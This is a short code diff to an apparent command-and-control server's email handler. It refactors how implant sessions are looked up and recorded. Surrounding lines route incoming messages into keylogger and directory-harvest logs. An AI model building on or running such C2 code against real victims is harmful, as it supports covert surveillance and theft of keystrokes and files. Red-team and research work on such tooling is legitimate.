@@ -210,11 +210,13 @@ public class EmailHandler extends C2Interface {
 					continue;// Improperly formatted email, discard
 				}
 				String sessionUID = hostname + ":" + username + ":" + protocol;
-				Integer sessionId = io.getSessionId(sessionUID);
-				if (sessionId == null) {
-					sessionId = io.addSession(username, hostname, protocol);
+				//Integer sessionId = io.getSessionId(sessionUID);
+				//if (sessionId == null) {
+				//	sessionId = io.addSession(username, hostname, protocol);
+				int sessionId = io.determineAndGetCorrectSessionId(hostname, username, protocol, false, sessionUID);
+				io.updateSessionContactTime(sessionId);
 					sessionToEmails.put(sessionUID, nextEmail.sender);
-				}
+				//}
 				if (isKeylogger) {
 					keylogger.writeEntry(hostname, nextEmail.body.toString());
 				}else if(isDirHarvest) {
